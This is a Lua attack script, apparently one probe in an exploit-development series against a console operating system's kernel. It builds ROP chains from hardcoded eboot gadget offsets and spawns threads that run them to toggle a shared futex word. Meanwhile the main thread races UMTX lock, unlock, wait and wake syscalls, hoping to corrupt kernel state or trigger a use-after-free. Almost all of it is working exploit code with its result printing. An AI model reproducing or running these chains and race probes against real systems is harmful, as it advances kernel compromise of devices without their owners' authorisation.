-- CRASH_CLASS: HIGH
-- PROBE 80q: UMTX mutex contention race — thread vs main thread
--
-- 80p confirmed: UMTX_OP_MUTEX_TRYLOCK(5) and UNLOCK(6) work on syscall 454.
-- TRYLOCK writes current TID into futex word; UNLOCK clears it.
--
-- Attack: ROP thread rapidly toggles futex word between 0 and a BOGUS TID
-- (one that doesn't exist) while main thread calls MUTEX_TRYLOCK/UNLOCK.
--
-- Race windows:
--   1. Kernel copyin reads futex=0 (unowned), starts lock path.
--      Thread writes bogus TID. Kernel CAS expects 0 but sees TID → retry
--      or error path. Repeated retries may corrupt kernel state.
--   2. Kernel copyin reads futex=bogus_TID, enters "owned by other thread"
--      path. Kernel looks up bogus TID → accesses freed/invalid thread
--      structure → potential UAF or info leak.
--   3. Main thread UNLOCK when futex has bogus TID: kernel checks
--      owner == current_thread. Mismatch → error path with bogus owner.
--
-- Also test: MUTEX_WAIT(2) with thread toggling — if kernel enters
-- sleep queue for a bogus owner, the wakeup path may corrupt the queue.

print("=== PROBE 80q: UMTX MUTEX RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

syscall.resolve({ sc_getpid = 20 })
local pid = syscall.sc_getpid():tonumber()
print("[*] pid=" .. pid)

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eboot = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("[*] eboot=" .. q(eboot))

local pop_rdi_ret   = eboot + 0xC9DFE
local pop_rax_ret   = eboot + 0x992
local mov_rdi_eax   = eboot + 0x92C68
local ret_gadget    = eboot + 0x42
local push_rax_ret  = eboot + 0x962

-- Shared futex in GPU mmap (both thread and main thread access it)
local sc_mmap = make_syscall(477)
local ok_f, futex_page = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(futex_page, 64)
print("[*] futex=" .. q(futex_page))

-- Marker to confirm thread is alive
local marker = memory.alloc(16)
zero(marker, 16)

-- =================================================================
-- SECTION A: TRYLOCK/UNLOCK race with bogus TID toggling
-- Thread writes: 0 → 0xDEAD → 0 → 0xDEAD ... (500 cycles)
-- Main: TRYLOCK then UNLOCK in tight loop
-- =================================================================
print("")
print("=== [A] TRYLOCK/UNLOCK vs BOGUS TID TOGGLE ===")

local ok_st, stack1 = pcall(function()
    return sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

local idx = 0
local function push(val)
    wq(stack1 + (idx * 8), val)
    idx = idx + 1
end

-- First: write marker to prove thread is alive
push(marker)                 -- RDI (first entry, RIP is pop_rdi_ret)
push(pop_rax_ret)
push(uint64(0xDEADBEEF))
push(mov_rdi_eax)            -- marker = DEADBEEF

-- Toggle futex between 0 and bogus TID (0xDEAD)
-- Keep chain small to avoid timeout during build
local TOGGLE_CYCLES = 300

for cycle = 1, TOGGLE_CYCLES do
    push(pop_rdi_ret)
    push(futex_page)
    push(pop_rax_ret)
    push(uint64(0xDEAD))
    push(mov_rdi_eax)

    push(pop_rdi_ret)
    push(futex_page)
    push(pop_rax_ret)
    push(uint64(0))
    push(mov_rdi_eax)

    if cycle % 100 == 0 then
        print("[*] chain: " .. idx .. " slots...")
    end
end

-- Infinite loop
push(pop_rax_ret)
push(push_rax_ret)
push(push_rax_ret)

print("[*] thread chain: " .. idx .. " slots (" .. idx * 8 .. " bytes)")

-- Build context
local ctx = memory.alloc(0x600)
zero(ctx, 0x600)
pcall(function() make_syscall(421)(uint64(ctx)) end)
wq(ctx + 0xE0, pop_rdi_ret)
wq(ctx + 0xF8, stack1)

local tid1 = memory.alloc(8)
zero(tid1, 8)

print("[*] spawning toggler thread...")
local ok1, rv1 = pcall(function()
    return make_syscall(430)(uint64(ctx), uint64(tid1), uint64(0))
end)
-- Single print immediately after binary dump
print("T1=" .. tostring(rv1) .. " ok=" .. tostring(ok1) .. " marker=" .. string.format("0x%08X", rd(marker) or 0))

if rd(marker) ~= 0xDEADBEEF then
    print("[!] thread didn't write marker, aborting")
    print("=== PROBE 80q INCOMPLETE ===")
    return
end
print("[*] thread alive, starting race...")

local sc_umtx = make_syscall(454)

-- Race: TRYLOCK then UNLOCK rapidly
local lock_ok = 0
local lock_fail = 0
local lock_anom = 0
local unlock_ok = 0
local unlock_fail = 0
local unlock_anom = 0
local crashes = 0

for i = 1, 500 do
    -- TRYLOCK: op=5, obj=futex
    local ok_l, rv_l = pcall(function()
        return sc_umtx(uint64(futex_page), uint64(5), uint64(0), uint64(0), uint64(0))
    end)

    if not ok_l then
        crashes = crashes + 1
    else
        local rv_n = to_num(rv_l)
        if rv_n == 0 then
            lock_ok = lock_ok + 1
            -- Got the lock — check what TID was written
            local owner = rd(futex_page) or 0

            -- UNLOCK
            local ok_u, rv_u = pcall(function()
                return sc_umtx(uint64(futex_page), uint64(6), uint64(0), uint64(0), uint64(0))
            end)
            if not ok_u then
                crashes = crashes + 1
            else
                local rv_u_n = to_num(rv_u)
                if rv_u_n == 0 then
                    unlock_ok = unlock_ok + 1
                elseif rv_u_n == 0xFFFFFFFF then
                    unlock_fail = unlock_fail + 1
                else
                    unlock_anom = unlock_anom + 1
                    if unlock_anom <= 3 then
                        print(string.format("[!] unlock anomaly i=%d rv=%s owner=0x%X", i, tostring(rv_l), owner))
                    end
                end
            end
        elseif rv_n == 0xFFFFFFFF then
            lock_fail = lock_fail + 1
        else
            lock_anom = lock_anom + 1
            if lock_anom <= 5 then
                print(string.format("[!] TRYLOCK anomaly i=%d rv=0x%X futex=0x%X", i, rv_n, rd(futex_page) or 0))
            end
        end
    end
end

print(string.format("[A] lock: ok=%d fail=%d anom=%d", lock_ok, lock_fail, lock_anom))
print(string.format("[A] unlock: ok=%d fail=%d anom=%d", unlock_ok, unlock_fail, unlock_anom))
print(string.format("[A] crashes=%d", crashes))

if lock_anom > 0 or unlock_anom > 0 then
    print("[A] *** ANOMALOUS MUTEX BEHAVIOR DETECTED ***")
end

-- =================================================================
-- SECTION B: MUTEX_WAIT(2) with bogus owner — kernel sleep queue race
-- If futex holds bogus TID, MUTEX_WAIT enters "wait for owner" path.
-- Kernel must look up the owner thread. Bogus TID → invalid lookup.
-- =================================================================
print("")
print("=== [B] MUTEX_WAIT WITH BOGUS OWNER ===")

-- Thread is still running (infinite loop), toggling futex
-- Set futex to a bogus TID manually, then call MUTEX_WAIT with timeout
local wait_results = {}

-- Create a timeout struct for non-blocking wait
-- struct _umtx_time { struct timespec _timeout; uint32_t _flags; uint32_t _clockid; }
local ts = memory.alloc(32)
zero(ts, 32)
wd(ts, 0)          -- tv_sec = 0
wd(ts + 8, 1000)   -- tv_nsec = 1000 (1 microsecond timeout)
wd(ts + 16, 0)     -- flags = 0
wd(ts + 20, 0)     -- clockid = CLOCK_REALTIME

for _, bogus_tid in ipairs({0xDEAD, 0x7FFF, 0x1, 0xFFFF, 0x8000, pid + 100, pid + 1000}) do
    -- Manually set futex to bogus owner (thread might overwrite, that's the race)
    wd(futex_page, bogus_tid)

    -- MUTEX_WAIT: op=2, obj=futex, val=0 (unused?), uaddr1=timeout, uaddr2=sizeof
    local ok_w, rv_w = pcall(function()
        return sc_umtx(uint64(futex_page), uint64(2), uint64(0),
            uint64(ts), uint64(16))
    end)

    local rv_n = -999
    if ok_w then rv_n = to_num(rv_w) end
    local futex_after = rd(futex_page) or 0

    if rv_n ~= 0 and rv_n ~= 0xFFFFFFFF and rv_n ~= -999 then
        print(string.format("[!] WAIT anomaly: bogus=0x%X rv=0x%X after=0x%X",
            bogus_tid, rv_n, futex_after))
    end

    table.insert(wait_results, {bogus_tid, rv_n, futex_after})
end

print("[B] MUTEX_WAIT results:")
for _, r in ipairs(wait_results) do
    print(string.format("  bogus=0x%04X rv=%d after=0x%X", r[1], r[2], r[3]))
end

-- =================================================================
-- SECTION C: MUTEX_WAKE(3) with bogus waiter — wake nonexistent thread
-- If we WAKE when the sleep queue has been corrupted by the race,
-- the kernel may traverse a corrupted linked list.
-- =================================================================
print("")
print("=== [C] MUTEX_WAKE ON RACED FUTEX ===")

local wake_ok = 0
local wake_fail = 0
local wake_anom = 0

for i = 1, 200 do
    -- Let the thread toggle the futex a bit
    -- Then wake
    local ok_wk, rv_wk = pcall(function()
        return sc_umtx(uint64(futex_page), uint64(3), uint64(0x7FFFFFFF), uint64(0), uint64(0))
    end)

    if not ok_wk then
        crashes = crashes + 1
    else
        local rv_n = to_num(rv_wk)
        if rv_n == 0 then
            wake_ok = wake_ok + 1
        elseif rv_n == 0xFFFFFFFF then
            wake_fail = wake_fail + 1
        else
            wake_anom = wake_anom + 1
            if wake_anom <= 3 then
                print(string.format("[!] WAKE anomaly i=%d rv=0x%X", i, rv_n))
            end
        end
    end
end

print(string.format("[C] wake: ok=%d fail=%d anom=%d", wake_ok, wake_fail, wake_anom))

-- =================================================================
-- SECTION D: LOCK contention — real TID vs thread toggle
-- Thread 2 does actual MUTEX_TRYLOCK via writing real TID pattern
-- (UMTX_MTX_CONTESTED flag set = 0x80000000 | owner_tid)
-- Main thread races TRYLOCK. Contested flag tricks kernel into
-- taking the slow/contention path with umtxq operations.
-- =================================================================
print("")
print("=== [D] CONTESTED MUTEX FLAG RACE ===")

-- Reset futex
wd(futex_page, 0)

-- Build thread 2: toggle futex between 0 and (0x80000000 | real_thread1_TID)
-- The CONTESTED flag makes the kernel enter the turnstile/PI path
local real_tid = rd(tid1) or 0
if real_tid == 0 then
    -- Use a low byte from tid buffer
    local tq = rq(tid1)
    if tq then
        if type(tq) == "table" and tq.l then real_tid = tq.l end
    end
end
local contested_val = 0x80000000 + (real_tid % 0x10000)

print("[*] thread1 TID=0x" .. string.format("%X", real_tid))
print("[*] contested value=0x" .. string.format("%08X", contested_val))

local ok_st2, stack2 = pcall(function()
    return sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

local idx2 = 0
local function push2(val)
    wq(stack2 + (idx2 * 8), val)
    idx2 = idx2 + 1
end

-- Toggle: contested → 0 → contested → 0 ...
for cycle = 1, 300 do
    if cycle == 1 then
        push2(futex_page)
        push2(pop_rax_ret)
        push2(uint64(contested_val))
        push2(mov_rdi_eax)

        push2(pop_rdi_ret)
        push2(futex_page)
        push2(pop_rax_ret)
        push2(uint64(0))
        push2(mov_rdi_eax)
    else
        push2(pop_rdi_ret)
        push2(futex_page)
        push2(pop_rax_ret)
        push2(uint64(contested_val))
        push2(mov_rdi_eax)

        push2(pop_rdi_ret)
        push2(futex_page)
        push2(pop_rax_ret)
        push2(uint64(0))
        push2(mov_rdi_eax)
    end
end

-- Infinite loop
push2(pop_rax_ret)
push2(push_rax_ret)
push2(push_rax_ret)

print("[*] thread2 chain: " .. idx2 .. " slots")

local ctx2 = memory.alloc(0x600)
zero(ctx2, 0x600)
pcall(function() make_syscall(421)(uint64(ctx2)) end)
wq(ctx2 + 0xE0, pop_rdi_ret)
wq(ctx2 + 0xF8, stack2)

local tid2 = memory.alloc(8)
zero(tid2, 8)

print("[*] spawning contested toggler...")
local ok2, rv2 = pcall(function()
    return make_syscall(430)(uint64(ctx2), uint64(tid2), uint64(0))
end)
print("T2=" .. tostring(rv2) .. " ok=" .. tostring(ok2))

-- Race TRYLOCK against contested flag
local cont_lock_ok = 0
local cont_lock_fail = 0
local cont_lock_anom = 0
local cont_crashes = 0

for i = 1, 500 do
    local ok_cl, rv_cl = pcall(function()
        return sc_umtx(uint64(futex_page), uint64(5), uint64(0), uint64(0), uint64(0))
    end)

    if not ok_cl then
        cont_crashes = cont_crashes + 1
    else
        local rv_n = to_num(rv_cl)
        if rv_n == 0 then
            cont_lock_ok = cont_lock_ok + 1
            -- Immediately unlock
            pcall(function()
                sc_umtx(uint64(futex_page), uint64(6), uint64(0), uint64(0), uint64(0))
            end)
        elseif rv_n == 0xFFFFFFFF then
            cont_lock_fail = cont_lock_fail + 1
        else
            cont_lock_anom = cont_lock_anom + 1
            if cont_lock_anom <= 5 then
                print(string.format("[!] CONTESTED lock anomaly i=%d rv=0x%X futex=0x%X",
                    i, rv_n, rd(futex_page) or 0))
            end
        end
    end
end

print(string.format("[D] contested: ok=%d fail=%d anom=%d crash=%d",
    cont_lock_ok, cont_lock_fail, cont_lock_anom, cont_crashes))

if cont_lock_anom > 0 then
    print("[D] *** CONTESTED MUTEX ANOMALY — KERNEL CONFUSION ***")
end
if cont_crashes > 0 then
    print("[D] *** CRASHES DURING CONTESTED RACE ***")
end

-- Final status
local alive = pcall(function() return syscall.sc_getpid():tonumber() end)
print("")
print("[*] alive=" .. tostring(alive))
print("[*] total_crashes=" .. (crashes + cont_crashes))
print("=== PROBE 80q COMPLETE ===")
